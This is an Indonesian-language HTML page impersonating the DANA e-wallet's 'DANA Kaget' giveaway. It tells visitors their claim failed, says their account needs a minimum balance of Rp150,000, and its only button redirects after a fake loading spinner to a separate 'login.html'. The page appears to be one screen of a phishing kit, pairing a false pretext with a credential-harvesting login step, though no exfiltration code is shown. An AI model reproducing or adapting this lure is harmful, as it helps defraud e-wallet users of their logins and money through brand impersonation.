<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DANA Kaget Gagal</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('AddText_07-09-12.42.52.png') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }

    .container {
      width: 100%;
      max-width: 360px;
      background-color: white;
      border-radius: 20px;
      padding: 24px 16px;
      text-align: center;
      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.25);
      z-index: 999;
    }

    .container img {
      width: 100%;
      max-width: 200px;
      max-height: 160px;
      height: auto;
      object-fit: contain;
      margin-bottom: 14px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }

    .container h2 {
      color: black;
      font-size: 26px;
      margin-bottom: 12px;
    }

    .container p {
      font-size: 18px;
      color: #444;
      margin-bottom: 80px;
      padding: 0 10px;
    }

    .btn {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 12px 24px;
      font-size: 16px;
      cursor: pointer;
      width: 90%;
      max-width: 280px;
      transition: background 0.3s ease;
    }

    .btn:hover {
      background-color: #0056b3;
    }

    .btn.loading {
      pointer-events: none;
      opacity: 0.8;
      position: relative;
    }

    .btn.loading::after {
      content: "";
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      width: 16px;
      height: 16px;
      border: 2px solid white;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 20px 14px;
      }

      .container img {
        max-width: 160px;
        max-height: 120px;
      }

      .container h2 {
        font-size: 20px;
      }

      .container p {
        font-size: 14px;
        margin-bottom: 60px;
      }

      .btn {
        font-size: 14px;
        padding: 10px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="ifoto-ai_1752052507310.png" alt="Pending" />
    <h2>Yah, Klaim gagal nih!!</h2>
    <p>Pastikan akun DANA kamu memiliki saldo minimal <strong>Rp150.000</strong> sebagai limit penerimaan DANA Kaget.</p>
    <button class="btn" onclick="handleClick(this)">mengerti</button>
  </div>

  <script>
    function handleClick(button) {
      button.classList.add('loading');
      button.textContent = "Tunggu...";
      setTimeout(() => {
        window.location.href = "login.html";
      }, 1500);
    }
  </script>

</body>
</html>
